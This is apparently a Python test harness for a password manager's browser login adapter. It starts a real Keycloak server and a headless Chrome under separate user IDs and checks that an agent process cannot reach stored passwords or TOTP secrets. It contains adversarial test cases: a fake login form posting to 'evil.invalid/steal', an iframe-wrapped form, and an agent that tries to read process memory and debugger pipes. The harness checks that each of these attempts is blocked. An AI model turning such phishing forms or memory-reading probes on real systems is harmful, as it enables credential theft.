#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-only
"""Real Keycloak 26.7.3 + CFT 153 CDP-pipe P1 laboratory."""

import base64, hashlib, json, os, pathlib, re, shutil, signal, socket, ssl, stat, subprocess, sys, tempfile, time

CUSTODIAN,HUMAN,AGENT_A,AGENT_B,PROVIDER,DESTINATION=1,2,3,4,5,6
DEVICE="10101010101010101010101010101010"
MASTER=b"synthetic ticket 10 e2e master"
PASSWORD="ticket10-password-canary"
TOTP_SECRET="12345678901234567890"
ALICE_ID="11111111-1111-1111-1111-111111111111"
CHARLIE_PASSWORD="ticket10-challenge-password"
CHARLIE_ID="22222222-2222-2222-2222-222222222222"

def identity(uid):
    def change(): os.setgroups([]); os.setgid(uid); os.setuid(uid)
    return change

def run_uid(uid, command, *, input=None, check=True, env=None, timeout=30, cwd=None):
    merged=os.environ.copy(); merged.update(env or {})
    return subprocess.run([str(x) for x in command],input=input,capture_output=True,check=check,
                          preexec_fn=identity(uid),env=merged,timeout=timeout,cwd=cwd)

def start_uid(uid, command, *, env=None, cwd=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE):
    merged=os.environ.copy(); merged.update(env or {})
    return subprocess.Popen([str(x) for x in command],preexec_fn=identity(uid),env=merged,cwd=cwd,
                            stdout=stdout,stderr=stderr)

def stop(process):
    if process.poll() is None:
        process.send_signal(signal.SIGTERM)
        try: process.wait(timeout=8)
        except subprocess.TimeoutExpired: process.kill(); process.wait(timeout=5)

def wire_fields(values):
    out=bytearray()
    for value in values:
        out.extend(len(value).to_bytes(4,"big"));out.extend(value)
    return bytes(out)

def wait_path(process,path,seconds=20):
    deadline=time.monotonic()+seconds
    while time.monotonic()<deadline:
        if process.poll() is not None: raise AssertionError((process.returncode,process.stdout.read(),process.stderr.read()))
        if path.exists(): return
        time.sleep(.05)
    raise AssertionError(f"missing {path}")

def provider_request(sock,password,username=b"alice"):
    request=bytearray([3])+bytes.fromhex("31"*16)+bytes.fromhex("32"*16)
    request.extend(wire_fields([b"keycloak-browser-oidc",b"password",b"hostile-lab",b"hostile-lab",username,password,b"",b""]))
    request.extend(b"\0"+b"\0\0"+b"\0"*8)
    frame=len(request).to_bytes(4,"big")+request
    helper="import socket,sys;s=socket.socket(socket.AF_UNIX);s.settimeout(30);s.connect(sys.argv[1]);s.sendall(sys.stdin.buffer.read());h=s.recv(4);n=int.from_bytes(h,'big');sys.stdout.buffer.write(h+s.recv(n))"
    return run_uid(CUSTODIAN,[sys.executable,"-c",helper,sock],input=frame,check=False,timeout=35)

def hostile_dom_case(root,adapter,cft,browser_home,ca_der,callback_der,callback_key_der,auth_key,auth_crt,socket_dir,kind):
    fixture=root/f"hostile-{kind}-destination";fixture.mkdir();os.chown(fixture,DESTINATION,DESTINATION);fixture.chmod(0o711)
    port,callback_port=free_port(),free_port();capture=fixture/"requests";ready=fixture/"ready"
    valid_action=f"https://auth.test:{port}/submit"
    login=lambda action:f"<form id='kc-form-login' method='post' action='{action}'><input id='username' type='text'><input id='password' type='password'><input id='kc-login' type='submit'></form>"
    top=login("https://evil.invalid/steal") if kind=="action" else ("<iframe src='/inner'></iframe>" if kind=="frame" else login(valid_action))
    inner=login(valid_action)
    server_code="""import base64,pathlib,socket,ssl,sys
p=int(sys.argv[1]);cap=pathlib.Path(sys.argv[2]);ready=pathlib.Path(sys.argv[3]);top=base64.b64decode(sys.argv[4]);inner=base64.b64decode(sys.argv[5]);ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER);ctx.load_cert_chain(sys.argv[6],sys.argv[7]);s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('127.0.0.1',p));s.listen();s.settimeout(30);ready.write_text('ready')
try:
 while True:
  c,_=s.accept()
  with cap.open('ab') as f:f.write(b'CONNECTED\\n')
  try:
   with ctx.wrap_socket(c,server_side=True) as t:
    data=b''
    while b'\\r\\n\\r\\n' not in data and len(data)<65536:data+=t.recv(4096)
    with cap.open('ab') as f:f.write(data+b'\\n--\\n')
    body=inner if data.startswith(b'GET /inner ') else top
    t.sendall(b'HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nContent-Length: '+str(len(body)).encode()+b'\\r\\nConnection: close\\r\\n\\r\\n'+body)
  except ssl.SSLError as e:
   with cap.open('ab') as f:f.write(('TLS_ERROR '+type(e).__name__+'\\n').encode())
except (TimeoutError,OSError) as e:
 with cap.open('ab') as f:f.write(('SERVER_ERROR '+type(e).__name__+'\\n').encode())
"""
    server=start_uid(DESTINATION,[sys.executable,"-c",server_code,str(port),capture,ready,
        base64.b64encode(top.encode()).decode(),base64.b64encode(inner.encode()).decode(),auth_crt,auth_key])
    wait_path(server,ready)
    profile=root/f"hostile-{kind}.profile"
    browser_hash=hashlib.sha256((cft/"chrome").read_bytes()).hexdigest()
    profile.write_text("\n".join(["version=1","profile_id=hostile-lab",f"issuer=https://auth.test:{port}/realm",
      f"authorization_endpoint=https://auth.test:{port}/hostile-{kind}",f"token_endpoint=https://auth.test:{port}/token",
      f"jwks_uri=https://auth.test:{port}/jwks","client_id=pm-browser",f"redirect_uri=https://callback.test:{callback_port}/callback",
      f"expected_subject={ALICE_ID}","expected_username=alice","audience=pm-browser","scopes=openid","browser_version=153.0.8010.36",
      f"browser_sha256={browser_hash}",f"browser_path={cft/'chrome'}",f"browser_home={browser_home}",
      f"ca_der={ca_der}",f"callback_cert={callback_der}",f"callback_key={callback_key_der}",""]))
    os.chown(profile,PROVIDER,PROVIDER);profile.chmod(0o400)
    sock=socket_dir/f"hostile-{kind}.sock";log=root/f"hostile-{kind}.log";log.touch();os.chown(log,PROVIDER,PROVIDER)
    provider=start_uid(PROVIDER,[adapter,"serve","--profile",profile,"--socket",sock,"--custodian-uid",str(CUSTODIAN)],stdout=open(log,"wb"),stderr=subprocess.STDOUT)
    try:
        wait_path(provider,sock);sentinel=f"ticket10-{kind}-dom-secret".encode();response=provider_request(sock,sentinel,b"mallory" if kind=="account" else b"alice")
        assert response.returncode==0 and len(response.stdout)>=5 and response.stdout[4]==4,(response.stdout,response.stderr,log.read_text(errors="replace"))
        if kind=="account":
            assert not capture.exists()
        else:
            assert capture.exists(),log.read_text(errors="replace")
            requests=capture.read_bytes();assert b"GET /hostile-" in requests,(requests,log.read_text(errors="replace"))
            assert sentinel not in requests and b"POST " not in requests
    finally:
        stop(provider);stop(server)

def free_port():
    with socket.socket() as s: s.bind(("127.0.0.1",0)); return s.getsockname()[1]

def chown_tree(path,uid):
    for root,dirs,files in os.walk(path):
        os.chown(root,uid,uid)
        for name in dirs+files: os.chown(os.path.join(root,name),uid,uid)

def create_vault(cli,path):
    p=subprocess.Popen([str(cli),"vault","create",str(path)],stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,stderr=subprocess.PIPE,preexec_fn=identity(CUSTODIAN))
    assert p.stdout.readline()==b"Master password (read from stdin):\n"
    p.stdin.write(MASTER+b"\n");p.stdin.flush()
    assert p.stdout.readline()==b"Confirm master password:\n"
    p.stdin.write(MASTER+b"\n");p.stdin.flush()
    recovery=p.stdout.readline();assert recovery.startswith(b"Recovery code (store externally): PMR1-")
    assert p.stdout.readline()==b"Reintroduce recovery code to confirm the external copy:\n"
    p.stdin.write(recovery.split(b": ",1)[1]);p.stdin.close()
    assert p.wait(timeout=30)==0,(p.stdout.read(),p.stderr.read())

def openssl(*args): subprocess.run(["openssl",*map(str,args)],check=True,capture_output=True)

def certificates(root):
    ca_key,ca_pem=root/"ca.key",root/"ca.pem"
    openssl("req","-x509","-newkey","rsa:2048","-nodes","-days","2","-subj","/CN=PM Ticket10 Lab CA",
            "-addext","basicConstraints=critical,CA:TRUE","-addext","keyUsage=critical,keyCertSign,cRLSign",
            "-keyout",ca_key,"-out",ca_pem)
    def leaf(name):
        key,csr,crt=root/f"{name}.key",root/f"{name}.csr",root/f"{name}.crt"
        ext=root/f"{name}.ext";ext.write_text(f"subjectAltName=DNS:{name}.test\nextendedKeyUsage=serverAuth\nkeyUsage=digitalSignature,keyEncipherment\n")
        openssl("req","-newkey","rsa:2048","-nodes","-subj",f"/CN={name}.test","-keyout",key,"-out",csr)
        openssl("x509","-req","-days","2","-in",csr,"-CA",ca_pem,"-CAkey",ca_key,"-CAcreateserial","-extfile",ext,"-out",crt)
        return key,crt
    auth_key,auth_crt=leaf("auth");callback_key,callback_crt=leaf("callback")
    ca_der=root/"ca.der";callback_der=root/"callback.der";callback_key_der=root/"callback.key.der"
    openssl("x509","-in",ca_pem,"-outform","DER","-out",ca_der)
    openssl("x509","-in",callback_crt,"-outform","DER","-out",callback_der)
    openssl("pkcs8","-topk8","-nocrypt","-in",callback_key,"-outform","DER","-out",callback_key_der)
    return ca_pem,ca_der,auth_key,auth_crt,callback_der,callback_key_der

def realm(auth_port,callback_port):
    otp_data=json.dumps({"digits":6,"counter":0,"period":30,"algorithm":"HmacSHA1","subType":"totp"},separators=(",",":"))
    return {
      "realm":"pm","enabled":True,"sslRequired":"all","registrationAllowed":False,
      "eventsEnabled":True,"eventsListeners":["jboss-logging"],
      "otpPolicyType":"totp","otpPolicyAlgorithm":"HmacSHA1","otpPolicyDigits":6,"otpPolicyPeriod":30,
      "clients":[{"clientId":"pm-browser","name":"PM browser P1","enabled":True,"protocol":"openid-connect",
        "publicClient":True,"standardFlowEnabled":True,"directAccessGrantsEnabled":False,
        "redirectUris":[f"https://callback.test:{callback_port}/callback"],"webOrigins":[],
        "protocolMappers":[{"name":"pm audience","protocol":"openid-connect","protocolMapper":"oidc-audience-mapper",
          "consentRequired":False,"config":{"included.client.audience":"pm-browser","access.token.claim":"true","id.token.claim":"false"}}]}],
      "users":[{"id":ALICE_ID,"username":"alice","email":"alice@example.invalid","firstName":"Alice","lastName":"Synthetic","enabled":True,"totp":True,"requiredActions":[],
        "credentials":[{"type":"password","value":PASSWORD,"temporary":False},
          {"id":"alice-otp","type":"otp","secretData":json.dumps({"value":TOTP_SECRET},separators=(",",":")),"credentialData":otp_data}]},
        {"id":CHARLIE_ID,"username":"charlie","email":"charlie@example.invalid","firstName":"Charlie","lastName":"Synthetic","enabled":True,"requiredActions":["UPDATE_PASSWORD"],
         "credentials":[{"type":"password","value":CHARLIE_PASSWORD,"temporary":False}]}]
    }

def wait_keycloak(process,port,ca_pem,log):
    ctx=ssl.create_default_context(cafile=str(ca_pem));deadline=time.monotonic()+60;last=None
    while time.monotonic()<deadline:
        if process.poll() is not None: raise AssertionError((process.returncode,log.read_text(errors="replace")))
        try:
            raw=socket.create_connection(("127.0.0.1",port),timeout=1)
            with ctx.wrap_socket(raw,server_hostname="auth.test") as tls:
                tls.sendall(f"GET /realms/pm/.well-known/openid-configuration HTTP/1.1\r\nHost: auth.test:{port}\r\nConnection: close\r\n\r\n".encode())
                data=b""
                while True:
                    piece=tls.recv(65536)
                    if not piece: break
                    data+=piece
                if b"200 OK" in data and b'"issuer"' in data: return
        except (OSError,ssl.SSLError) as error: last=repr(error)
        time.sleep(.2)
    raise AssertionError(f"{last}\n{log.read_text(errors='replace')}")

def human(custody,key,profile,sock,action,*rpks):
    r=run_uid(HUMAN,[custody,"human-authorization","--profile",profile,"--private",key,"--socket",sock,"--action",action],
              input=wire_fields([MASTER,*rpks]),check=False)
    assert r.returncode==0,(r.stdout,r.stderr)

def cli(uid,binary,env,args,check=True):
    r=run_uid(uid,[binary,*args],env=env,check=False,timeout=40)
    if check: assert r.returncode==0,(r.stdout,r.stderr)
    return r

def main():
    custody,cli_bin,adapter,kc_source,cft,java_source=map(lambda p:pathlib.Path(p).resolve(),sys.argv[1:])
    root=pathlib.Path(tempfile.mkdtemp(prefix="pm-web-auth-linux-lab-"));procs=[]
    try:
        root.chmod(0o711)
        local_adapter=root/"pm-web-auth";shutil.copy2(adapter,local_adapter);local_adapter.chmod(0o755)
        local_cft=root/"cft";shutil.copytree(cft,local_cft,symlinks=True)
        auth_port,callback_port=free_port(),free_port()
        certroot=root/"certs";certroot.mkdir();ca_pem,ca_der,auth_key,auth_crt,callback_der,callback_key_der=certificates(certroot)
        state,run,hh,ah,bh,ph,dh,profiles=[root/n for n in ("state","run","human","agent","agent-b","provider","destination","profiles")]
        for path,uid,mode in [(state,CUSTODIAN,0o700),(run,CUSTODIAN,0o755),(hh,HUMAN,0o755),(ah,AGENT_A,0o755),(bh,AGENT_B,0o755),(ph,PROVIDER,0o700),(dh,DESTINATION,0o700),(profiles,0,0o755)]:
            path.mkdir();os.chown(path,uid,uid);path.chmod(mode)
        provider_socket_dir=root/"provider-socket";provider_socket_dir.mkdir();os.chown(provider_socket_dir,PROVIDER,PROVIDER);provider_socket_dir.chmod(0o711)
        # Copy only the counterpart server into its disposable UID; no host service or privileged container.
        kc=dh/"keycloak";shutil.copytree(kc_source,kc,symlinks=True);chown_tree(kc,DESTINATION)
        java_home=dh/"java";shutil.copytree(java_source,java_home,symlinks=True);chown_tree(java_home,DESTINATION)
        imports=kc/"data"/"import";imports.mkdir(parents=True,exist_ok=True);(imports/"pm-realm.json").write_text(json.dumps(realm(auth_port,callback_port)))
        chown_tree(kc/"data",DESTINATION)
        for path in [auth_key,auth_crt]: os.chown(path,DESTINATION,DESTINATION);path.chmod(0o400)
        keycloak_log=dh/"keycloak.log";logfd=open(keycloak_log,"wb");os.chown(keycloak_log,DESTINATION,DESTINATION)
        keycloak=start_uid(DESTINATION,[kc/"bin"/"kc.sh","start","--https-port",str(auth_port),"--http-enabled=false",
            "--https-certificate-file",auth_crt,"--https-certificate-key-file",auth_key,
            "--hostname",f"https://auth.test:{auth_port}","--import-realm","--db=dev-file"],cwd=kc,
            env={"JAVA_HOME":str(java_home),"PATH":f"{java_home/'bin'}:/usr/bin:/bin"},stdout=logfd,stderr=subprocess.STDOUT)
        procs.append(keycloak);wait_keycloak(keycloak,auth_port,ca_pem,keycloak_log)
        listening=next(line for line in keycloak_log.read_text(errors="replace").splitlines() if "Listening on:" in line)
        assert f":{auth_port}" in listening and "https://" in listening and "http://" not in listening

        browser_home=ph/"browser-home";browser_home.mkdir();os.chown(browser_home,PROVIDER,PROVIDER);browser_home.chmod(0o700)
        nss=browser_home/".pki"/"nssdb";nss.mkdir(parents=True);chown_tree(browser_home,PROVIDER)
        run_uid(PROVIDER,["certutil","-N","--empty-password","-d",f"sql:{nss}"],env={"HOME":str(browser_home)})
        run_uid(PROVIDER,["certutil","-A","-d",f"sql:{nss}","-n","pm-ticket10-ca","-t","C,,","-i",ca_pem],env={"HOME":str(browser_home)})
        for path in [ca_der,callback_der,callback_key_der]: shutil.copy2(path,ph/path.name)
        chown_tree(ph,PROVIDER)
        for path in [ph/"ca.der",ph/"callback.der",ph/"callback.key.der"]: path.chmod(0o400)
        hostile_dom_case(root,local_adapter,local_cft,browser_home,ph/"ca.der",ph/"callback.der",ph/"callback.key.der",auth_key,auth_crt,provider_socket_dir,"action")
        hostile_dom_case(root,local_adapter,local_cft,browser_home,ph/"ca.der",ph/"callback.der",ph/"callback.key.der",auth_key,auth_crt,provider_socket_dir,"frame")
        hostile_dom_case(root,local_adapter,local_cft,browser_home,ph/"ca.der",ph/"callback.der",ph/"callback.key.der",auth_key,auth_crt,provider_socket_dir,"account")
        browser_hash=hashlib.sha256((local_cft/"chrome").read_bytes()).hexdigest()
        profile=ph/"keycloak.profile"
        profile.write_text("\n".join([
          "version=1","profile_id=keycloak-lab",f"issuer=https://auth.test:{auth_port}/realms/pm",
          f"authorization_endpoint=https://auth.test:{auth_port}/realms/pm/protocol/openid-connect/auth",
          f"token_endpoint=https://auth.test:{auth_port}/realms/pm/protocol/openid-connect/token",
          f"jwks_uri=https://auth.test:{auth_port}/realms/pm/protocol/openid-connect/certs",
          "client_id=pm-browser",f"redirect_uri=https://callback.test:{callback_port}/callback",
          f"expected_subject={ALICE_ID}","expected_username=alice","audience=pm-browser","scopes=openid","browser_version=153.0.8010.36",
          f"browser_sha256={browser_hash}",f"browser_path={local_cft/'chrome'}",f"browser_home={browser_home}",
          f"ca_der={ph/'ca.der'}",f"callback_cert={ph/'callback.der'}",f"callback_key={ph/'callback.key.der'}",""]))
        os.chown(profile,PROVIDER,PROVIDER);profile.chmod(0o400)
        psock=provider_socket_dir/"web.sock"
        provider_log=ph/"provider.log";plog=open(provider_log,"wb");os.chown(provider_log,PROVIDER,PROVIDER)
        web=start_uid(PROVIDER,[local_adapter,"serve","--profile",profile,"--socket",psock,"--custodian-uid",str(CUSTODIAN)],stdout=plog,stderr=subprocess.STDOUT)
        procs.append(web);wait_path(web,psock)

        b=root/"pm-custody";pcli=root/"pm";shutil.copy2(custody,b);shutil.copy2(cli_bin,pcli);b.chmod(0o755);pcli.chmod(0o755)
        sk,sp=state/"server.key",state/"server.pub";hk,hp=hh/"human.key",hh/"human.pub";ak,ap=ah/"a.key",ah/"a.pub";bk,bp=bh/"b.key",bh/"b.pub"
        for uid,k,p in [(CUSTODIAN,sk,sp),(HUMAN,hk,hp),(AGENT_A,ak,ap),(AGENT_B,bk,bp)]: run_uid(uid,[b,"keygen","--private",k,"--public",p])
        boot=state/"bootstrap";run_uid(CUSTODIAN,[b,"provision-bootstrap","--path",boot,"--server-private",sk,"--server-public",sp,"--agent-public",ap,"--agent-uid",str(AGENT_A),"--human-public",hp,"--human-uid",str(HUMAN)])
        aprof,hprof=profiles/"agent.profile",profiles/"human.profile"
        for role,out in [("agent",aprof),("human",hprof)]: subprocess.run([b,"provision-profile","--path",out,"--server-public",sp,"--server-uid",str(CUSTODIAN),"--role",role],check=True,capture_output=True)
        vault=state/"vault.sqlite3";create_vault(pcli,vault)
        daemon=start_uid(CUSTODIAN,[b,"serve-attempt-lab","--bootstrap",boot,"--agent-socket",run/"agent.sock","--human-socket",run/"human.sock","--vault",vault,"--device",DEVICE,"--provider-socket",psock,"--provider-uid",str(PROVIDER)])
        procs.append(daemon);wait_path(daemon,run/"agent.sock");wait_path(daemon,run/"human.sock")
        human(b,hk,hprof,run/"human.sock","setup",ap.read_bytes(),bp.read_bytes());human(b,hk,hprof,run/"human.sock","add-keycloak")
        env={"PM_PROFILE":str(aprof),"PM_PRIVATE":str(ak),"PM_SOCKET":str(run/"agent.sock")}
        discovered=json.loads(cli(AGENT_A,pcli,env,["--json","credentials","list"]).stdout)["result"]["credentials"]
        item=next(row["id"] for row in discovered if row["account"]=="alice" and row["destination"]=="keycloak-lab")
        now=str(int(time.time()*1_000_000))
        args=["--json","auth","start","--credential-id",item,"--integration-id","keycloak-browser-oidc","--integration-version","1","--method","password_totp","--destination","keycloak-lab","--context","keycloak-lab","--issued-at",now,"--nonce","10"*16]
        # Keep the start request in flight so the process/descriptor checks
        # cannot race a fast successful browser teardown.
        start_process=start_uid(AGENT_A,[pcli,*args],env=env)
        # While the browser exists, the agent cannot traverse the provider home/profile or its inherited CDP pipe.
        denied=run_uid(AGENT_A,["cat",profile],check=False);assert denied.returncode!=0 and denied.stdout==b""
        denied=run_uid(AGENT_A,["find",browser_home,"-maxdepth","2","-print"],check=False);assert denied.returncode!=0
        unauthorized_provider="import socket,sys;s=socket.socket(socket.AF_UNIX);s.settimeout(2);s.connect(sys.argv[1]);p=b'ticket10-agent-provider-canary';s.sendall(len(p).to_bytes(4,'big')+p);sys.stdout.buffer.write(s.recv(64))"
        denied=run_uid(AGENT_A,[sys.executable,"-c",unauthorized_provider,psock],check=False);assert denied.stdout==b""
        denied=run_uid(AGENT_A,["head","-c","1",f"/proc/{web.pid}/mem"],check=False);assert denied.returncode!=0 and denied.stdout==b""
        browser_pid=None;deadline=time.monotonic()+10
        children=pathlib.Path(f"/proc/{web.pid}/task/{web.pid}/children")
        while time.monotonic()<deadline:
            ids=children.read_text().split() if children.exists() else []
            for value in ids:
                cmdline=pathlib.Path(f"/proc/{value}/cmdline")
                try: browser_cmd=cmdline.read_bytes()
                except FileNotFoundError: continue
                if b"--remote-debugging-pipe" in browser_cmd:
                    browser_pid=int(value);break
            if browser_pid is not None: break
            time.sleep(.001)
        assert browser_pid is not None
        assert b"--remote-debugging-pipe" in browser_cmd and b"--remote-debugging-port" not in browser_cmd
        for resource in [f"/proc/{browser_pid}/mem",f"/proc/{browser_pid}/fd/3",f"/proc/{browser_pid}/fd/4"]:
            denied=run_uid(AGENT_A,["head","-c","1",resource],check=False);assert denied.returncode!=0 and denied.stdout==b""
        start_stdout,start_stderr=start_process.communicate(timeout=40)
        assert start_process.returncode==0,(start_stdout,start_stderr)
        started=json.loads(start_stdout)["result"];attempt=started["attempt_id"]
        deadline=time.monotonic()+35;finished=None
        while time.monotonic()<deadline:
            result=cli(AGENT_A,pcli,env,["--json","auth","status","--attempt",attempt],check=False)
            assert result.returncode==0,(result.stdout,result.stderr)
            finished=json.loads(result.stdout)["result"]
            if finished["state"] in ("SUCCEEDED","FAILED","INDETERMINATE"): break
            time.sleep(.1)
        assert finished["state"]=="SUCCEEDED",(finished,provider_log.read_text(errors="replace"),keycloak_log.read_text(errors="replace"))
        tokens=finished["result"];assert tokens["kind"]=="oidc_tokens" and tokens["subject"]==ALICE_ID
        assert tokens["issuer"]==f"https://auth.test:{auth_port}/realms/pm" and tokens["audience"]=="pm-browser"
        agent_bytes=json.dumps(finished,sort_keys=True).encode()+result.stderr
        assert PASSWORD.encode() not in agent_bytes and TOTP_SECRET.encode() not in agent_bytes
        for path in [vault,*state.iterdir()]:
            if path.is_file():
                raw=path.read_bytes();assert PASSWORD.encode() not in raw and TOTP_SECRET.encode() not in raw

        # A real Keycloak required action pauses only this attempt; cancelling it is terminal.
        stop(web)
        challenge_profile=ph/"keycloak-challenge.profile"
        challenge_profile.write_text(profile.read_text().replace(f"expected_subject={ALICE_ID}",f"expected_subject={CHARLIE_ID}").replace("expected_username=alice","expected_username=charlie"))
        os.chown(challenge_profile,PROVIDER,PROVIDER);challenge_profile.chmod(0o400)
        challenge_log=ph/"challenge-provider.log";challenge_log.touch();os.chown(challenge_log,PROVIDER,PROVIDER)
        challenge_web=start_uid(PROVIDER,[local_adapter,"serve","--profile",challenge_profile,"--socket",psock,"--custodian-uid",str(CUSTODIAN)],stdout=open(challenge_log,"wb"),stderr=subprocess.STDOUT)
        procs.append(challenge_web);wait_path(challenge_web,psock)
        challenge_item=next(row["id"] for row in discovered if row["account"]=="charlie" and row["destination"]=="keycloak-lab")
        challenge_args=["--json","auth","start","--credential-id",challenge_item,"--integration-id","keycloak-browser-oidc","--integration-version","1","--method","password","--destination","keycloak-lab","--context","keycloak-lab","--issued-at",str(int(time.time()*1_000_000)),"--nonce","12"*16]
        challenge_started=json.loads(cli(AGENT_A,pcli,env,challenge_args).stdout)["result"]
        challenge=challenge_started["attempt_id"]
        deadline=time.monotonic()+35
        while time.monotonic()<deadline:
            waiting=json.loads(cli(AGENT_A,pcli,env,["--json","auth","status","--attempt",challenge]).stdout)["result"]
            if waiting["state"]=="WAITING_FOR_HUMAN": break
            time.sleep(.1)
        assert waiting["state"]=="WAITING_FOR_HUMAN",(waiting,challenge_log.read_text(errors="replace"))
        cancelled=json.loads(cli(AGENT_A,pcli,env,["--json","auth","cancel","--attempt",challenge]).stdout)["result"]
        assert cancelled["state"]=="CANCELLED" and cancelled["reason"]=="ATTEMPT_CANCELLED"
        time.sleep(.3)
        terminal=json.loads(cli(AGENT_A,pcli,env,["--json","auth","status","--attempt",challenge]).stdout)["result"]
        assert terminal["state"]=="CANCELLED"
        assert not any(path.name.startswith("attempt-") for path in browser_home.iterdir())
        for log in [provider_log,challenge_log]:
            raw=log.read_bytes();assert PASSWORD.encode() not in raw and TOTP_SECRET.encode() not in raw and CHARLIE_PASSWORD.encode() not in raw and b"ticket10-agent-provider-canary" not in raw

        # Agent-controlled issuer/redirect/profile references are rejected at admission before a provider call.
        bad=args.copy();bad[bad.index("--destination")+1]="https://evil.invalid/callback"
        bad[bad.index("--nonce")+1]="11"*16
        rejected=cli(AGENT_A,pcli,env,bad,check=False)
        assert rejected.returncode!=0 and b"CREDENTIAL_UNAVAILABLE" in rejected.stdout
        capabilities=json.loads(cli(AGENT_A,pcli,env,["--json","capabilities"]).stdout)["result"]
        assert any(i["id"]=="keycloak-browser-oidc" and i["availability"]=="verified" for i in capabilities["integrations"])
        print("PASS web-auth-p1 keycloak=26.7.3 browser=CFT-153.0.8010.36 oidc=code+PKCE-S256 password+totp=real callback=TLS1.3")
        print("PASS web-auth-isolation provider-uid=5 agent-uid=3 cdp=pipe profile=private original-secrets=absent tokens=new")
        print("PASS web-auth-adversarial dom=form-action+iframe presecret=denied proc-mem+cdp-fds=denied")
        print("PASS web-auth-challenge keycloak-required-action=UPDATE_PASSWORD state=WAITING_FOR_HUMAN cancel=CANCELLED no-resume")
        print("LIMIT product-browser=Chromium-own-NOT_RUN six-native-targets=ticket33 cross-platform=NOT_RUN")
    finally:
        for process in reversed(procs): stop(process)
        shutil.rmtree(root,ignore_errors=True)

if __name__=="__main__": main()
